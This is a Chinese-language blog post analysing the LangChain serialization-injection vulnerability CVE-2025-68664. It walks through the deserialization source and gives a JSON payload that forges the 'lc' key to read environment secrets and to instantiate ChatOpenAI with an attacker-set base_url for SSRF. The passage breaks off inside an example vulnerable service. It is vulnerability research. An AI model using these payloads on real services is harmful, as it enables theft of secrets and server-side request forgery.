<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>langchain序列化注入-CVE-2025-68664 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="langchain序列化 CVE-2025-68664影响版本langchain-core &lt; 0.3.81 langchain-core &gt;&#x3D; 1.0.0 且 &lt; 1.2.5 概要具体位于这里 from langchain_core.load import dumps, dumpd, load, loads  dumps()与dumpd()函数在处理字典对象时没有对l">
<meta property="og:type" content="article">
<meta property="og:title" content="langchain序列化注入-CVE-2025-68664">
<meta property="og:url" content="http://ireel.github.io/2026/01/03/cve-2025-68664/index.html">
<meta property="og:site_name" content="ivory&#39;s blog">
<meta property="og:description" content="langchain序列化 CVE-2025-68664影响版本langchain-core &lt; 0.3.81 langchain-core &gt;&#x3D; 1.0.0 且 &lt; 1.2.5 概要具体位于这里 from langchain_core.load import dumps, dumpd, load, loads  dumps()与dumpd()函数在处理字典对象时没有对l">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://ireel.github.io/img/langchain.png">
<meta property="article:published_time" content="2026-01-03T12:21:17.000Z">
<meta property="article:modified_time" content="2026-01-03T12:23:11.778Z">
<meta property="article:author" content="ivory">
<meta property="article:tag" content="python">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="ai">
<meta property="article:tag" content="langchain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ireel.github.io/img/langchain.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "langchain序列化注入-CVE-2025-68664",
  "url": "http://ireel.github.io/2026/01/03/cve-2025-68664/",
  "image": "http://ireel.github.io/img/langchain.png",
  "datePublished": "2026-01-03T12:21:17.000Z",
  "dateModified": "2026-01-03T12:23:11.778Z",
  "author": [
    {
      "@type": "Person",
      "name": "ivory",
      "url": "http://ireel.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2026/01/03/cve-2025-68664/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'langchain序列化注入-CVE-2025-68664',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/langchain.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">langchain序列化注入-CVE-2025-68664</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">langchain序列化注入-CVE-2025-68664</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-03T12:21:17.000Z" title="发表于 2026-01-03 20:21:17">2026-01-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-03T12:23:11.778Z" title="更新于 2026-01-03 20:23:11">2026-01-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86/">知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="langchain序列化-CVE-2025-68664"><a href="#langchain序列化-CVE-2025-68664" class="headerlink" title="langchain序列化 CVE-2025-68664"></a>langchain序列化 CVE-2025-68664</h1><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>langchain-core</code> &lt; 0.3.81</p>
<p><code>langchain-core</code> &gt;&#x3D; 1.0.0 且 &lt; 1.2.5</p>
<h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>具体位于这里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.load <span class="keyword">import</span> dumps, dumpd, load, loads</span><br></pre></td></tr></table></figure>

<p><code>dumps()</code>与<code>dumpd()</code>函数在处理字典对象时没有对<code>lc</code>这个键进行转义</p>
<p>这个键属于内部保留键，如果用户手动添加这个键值，就能伪造成内部的操作</p>
<p>实现窃取环境变量等操作</p>
<h3 id="调试分析-源码逻辑"><a href="#调试分析-源码逻辑" class="headerlink" title="调试分析&#x2F;源码逻辑"></a>调试分析&#x2F;源码逻辑</h3><p>从loads开始调试</p>
<p>可以清楚的看到经过<code>dumpd()</code>函数的字典中的<code>lc</code>键并没有被转义</p>
<p><img src="/2026/01/03/cve-2025-68664/1.png"></p>
<p>步入进<code>beta()</code>装饰器，这个不重要，在<code>return</code>回外部时步入即可</p>
<p>进入<code>loads()</code>函数本身：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@beta()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params"></span></span><br><span class="line"><span class="params">    text: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    secrets_map: <span class="type">Optional</span>[<span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    valid_namespaces: <span class="type">Optional</span>[<span class="built_in">list</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    secrets_from_env: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    additional_import_mappings: <span class="type">Optional</span>[<span class="built_in">dict</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, ...], <span class="built_in">tuple</span>[<span class="built_in">str</span>, ...]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    ignore_unserializable_fields: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Any</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.loads(</span><br><span class="line">        text,</span><br><span class="line">        object_hook=Reviver(</span><br><span class="line">            secrets_map,</span><br><span class="line">            valid_namespaces,</span><br><span class="line">            secrets_from_env,</span><br><span class="line">            additional_import_mappings,</span><br><span class="line">            ignore_unserializable_fields=ignore_unserializable_fields,</span><br><span class="line">        ),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p><code>loads</code>函数中是一个<code>json.loads</code>函数的操作</p>
<p>第一个参数代表需要加载成<code>json</code>（字典）的<code>json</code>格式字符串，</p>
<p>第二个<code>object_hook</code>是一个可执行对象，会接收text转换出的j<code>json</code>对象并进行处理</p>
<p>可以简单写一个脚本测试一下这个过程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">obj_text = <span class="string">&quot;&#123;\&quot;a\&quot;: 123, \&quot;b\&quot;: 1234&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;Test a=<span class="subst">&#123;self.a&#125;</span> b=<span class="subst">&#123;self.b&#125;</span>&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_decoder</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> d <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> d:</span><br><span class="line">        <span class="keyword">return</span> Test(d[<span class="string">&#x27;a&#x27;</span>], d[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.loads(obj_text,object_hook=user_decoder))</span><br><span class="line"><span class="comment"># &lt;Test a=123 b=1234&gt;</span></span><br></pre></td></tr></table></figure>

<p>不过注意<code>object_hook</code>需要是一个可执行对象，而不是只能是函数</p>
<p>所以传入实现了<code>__call__</code>魔术方法的类的实例化对象，</p>
<p>或实现了<code>__init__</code>构造函数的类都是可行的</p>
<p>所以回到<code>loads</code>函数中的这一段代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> json.loads(</span><br><span class="line">    text,</span><br><span class="line">    object_hook=Reviver(</span><br><span class="line">        secrets_map,</span><br><span class="line">        valid_namespaces,</span><br><span class="line">        secrets_from_env,</span><br><span class="line">        additional_import_mappings,</span><br><span class="line">        ignore_unserializable_fields=ignore_unserializable_fields,</span><br><span class="line">    ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这里已经主动实例化了<code>Reviver</code>的对象，</p>
<p>所以<code>object_hook</code>实际上是<code>Reviver</code>的<code>__call__</code>方法，</p>
<p>我们步入<code>json.loads</code>的过程之间也可以看到这个方法：</p>
<p><img src="/2026/01/03/cve-2025-68664/2.png"></p>
<p>经过<code>Reviver</code>的过程后我们原本的字典对象就直接变为了读取出来的环境变量：</p>
<p><img src="/2026/01/03/cve-2025-68664/3.png"></p>
<p>我们直接在需要看的<code>__call__</code>方法的位置下断点</p>
<p>就成功找到了在环境变量中读取的过程了：</p>
<p><img src="/2026/01/03/cve-2025-68664/4.png"></p>
<p><img src="/2026/01/03/cve-2025-68664/5.png"></p>
<p><img src="/2026/01/03/cve-2025-68664/6.png"></p>
<p>此处的<code>os.environ</code>包含了python程序运行时从系统环境变量中拷贝过来的变量</p>
<p>还有在程序中手动设置的变量</p>
<p>再完整看一下源码，逻辑还是很好懂的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, value: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;secret&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        [key] = value[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> <span class="variable language_">self</span>.secrets_map:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.secrets_map[key]</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.secrets_from_env <span class="keyword">and</span> key <span class="keyword">in</span> os.environ <span class="keyword">and</span> os.environ[key]:</span><br><span class="line">            <span class="keyword">return</span> os.environ[key]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;not_implemented&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.ignore_unserializable_fields:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        msg = (</span><br><span class="line">            <span class="string">&quot;Trying to load an object that doesn&#x27;t implement &quot;</span></span><br><span class="line">            <span class="string">f&quot;serialization: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;constructor&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        [*namespace, name] = value[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        mapping_key = <span class="built_in">tuple</span>(value[<span class="string">&quot;id&quot;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            namespace[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.valid_namespaces</span><br><span class="line">            <span class="comment"># The root namespace [&quot;langchain&quot;] is not a valid identifier.</span></span><br><span class="line">            <span class="keyword">or</span> namespace == [<span class="string">&quot;langchain&quot;</span>]</span><br><span class="line">        ):</span><br><span class="line">            msg = <span class="string">f&quot;Invalid namespace: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line">        <span class="comment"># Has explicit import path.</span></span><br><span class="line">        <span class="keyword">if</span> mapping_key <span class="keyword">in</span> <span class="variable language_">self</span>.import_mappings:</span><br><span class="line">            import_path = <span class="variable language_">self</span>.import_mappings[mapping_key]</span><br><span class="line">            <span class="comment"># Split into module and name</span></span><br><span class="line">            import_dir, name = import_path[:-<span class="number">1</span>], import_path[-<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># Import module</span></span><br><span class="line">            mod = importlib.import_module(<span class="string">&quot;.&quot;</span>.join(import_dir))</span><br><span class="line">        <span class="keyword">elif</span> namespace[<span class="number">0</span>] <span class="keyword">in</span> DISALLOW_LOAD_FROM_PATH:</span><br><span class="line">            msg = (</span><br><span class="line">                <span class="string">&quot;Trying to deserialize something that cannot &quot;</span></span><br><span class="line">                <span class="string">&quot;be deserialized in current version of langchain-core: &quot;</span></span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;mapping_key&#125;</span>.&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line">        <span class="comment"># Otherwise, treat namespace as path.</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mod = importlib.import_module(<span class="string">&quot;.&quot;</span>.join(namespace))</span><br><span class="line"></span><br><span class="line">        cls = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The class must be a subclass of Serializable.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">issubclass</span>(cls, Serializable):</span><br><span class="line">            msg = <span class="string">f&quot;Invalid namespace: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We don&#x27;t need to recurse on kwargs</span></span><br><span class="line">        <span class="comment"># as json.loads will do that for us.</span></span><br><span class="line">        kwargs = value.get(<span class="string">&quot;kwargs&quot;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">return</span> cls(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>

<p>注意到还有两个我们没有使用过的<code>type</code></p>
<p>其中<code>not_implemented</code>是用作容错的，没有什么作用</p>
<p>而<code>constructor</code>就相等有意思了，可以实例化<code>langchain</code>白名单中的类</p>
<p>白名单默认为这些：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEFAULT_NAMESPACES = [</span><br><span class="line">    <span class="string">&quot;langchain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_core&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_community&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_anthropic&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_groq&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_google_genai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_aws&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_openai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_google_vertexai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_mistralai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_fireworks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_xai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_sambanova&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_perplexity&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>最好用的是<code>langchain_community</code>,里面有大量的工具可以执行代码，读取文件，打SSRF等</p>
<p>可惜的是他在黑名单里：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DISALLOW_LOAD_FROM_PATH = [</span><br><span class="line">    <span class="string">&quot;langchain_community&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>别的利用可能稍微有限些，例如如果想要利用<code>langchain_openai</code>打<code>ssrf</code></p>
<p>构造payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;lc&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span>,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: [<span class="string">&quot;langchain_openai&quot;</span>, <span class="string">&quot;chat_models&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;ChatOpenAI&quot;</span>],</span><br><span class="line">  <span class="string">&quot;kwargs&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;openai_api_key&quot;</span>: <span class="string">&quot;sk-ssrf-test-key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;base_url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;max_retries&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;temperature&quot;</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例化的过程不触发请求，</p>
<p>而是需要目标服务中额外调用<code>langchain_openai</code>实例化对象的<code>invoke</code>方法</p>
<p>肯定不会主动写这种逻辑的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">restored_obj = loads(json_str)</span><br><span class="line">response = restored_obj.invoke(<span class="string">&quot;Hello, are you there?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>不过如果确实这么写了是能收到请求&#x2F;响应</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">en</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [03/Jan/2026 19:14:40] &quot;POST /chat/completions HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>



<h3 id="实际场景复现"><a href="#实际场景复现" class="headerlink" title="实际场景复现"></a>实际场景复现</h3><p>在这个漏洞的实际利用中，我们肯定没法直接调用目标服务的<code>loads</code>函数</p>
<p>取决于不同服务何时主动调用loads</p>
<p>例如这个服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, HTTPException</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain_core.messages <span class="keyword">import</span> HumanMessage, AIMessage</span><br><span class="line"><span class="keyword">from</span> langchain_core.load <span class="keyword">import</span> dumpd, load</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">DB_FILE = <span class="string">&quot;chat_history.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(DB_FILE):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump([], f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChatInput</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    message: <span class="built_in">str</span></span><br><span class="line">    metadata: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>] = &#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/send_message&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">chat_input: ChatInput</span>):</span><br><span class="line">    msg = HumanMessage(content=chat_input.message, additional_kwargs=chat_input.metadata)</span><br><span class="line">    </span><br><span class="line">    serialized_msg = 